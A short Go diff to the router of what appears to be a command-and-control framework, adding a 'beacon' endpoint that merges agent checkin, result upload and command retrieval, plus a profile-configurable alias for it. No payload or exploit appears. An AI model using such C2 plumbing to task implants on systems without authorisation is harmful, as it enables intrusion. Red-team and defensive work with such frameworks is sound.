@@ -67,6 +67,7 @@ func (r *Router) Setup() *gin.Engine {
 		v1.GET("/agents/:id", r.handlers.GetAgent)
 		v1.DELETE("/agents/:id", r.handlers.RemoveAgent)
 		v1.POST("/checkin", r.handlers.AgentCheckin)
+		v1.POST("/beacon/:id", r.handlers.AgentBeacon)
 
 		// Command execution
 		v1.POST("/command", r.handlers.ExecuteCommand)
@@ -240,6 +241,9 @@ func (r *Router) RegisterProfileAliases(engine *gin.Engine, profileName string) 
 
 	// Checkin alias
 	engine.POST(p.CheckinPath, r.handlers.AgentCheckin)
+
+	// Beacon alias — combined checkin+result+command endpoint
+	engine.POST(p.BeaconGinPattern(), r.handlers.AgentBeacon)
 
 	// Command-next alias — gin pattern uses :id instead of {agent_id}
 	engine.GET(p.CommandGinPattern(), r.handlers.GetNextCommand)
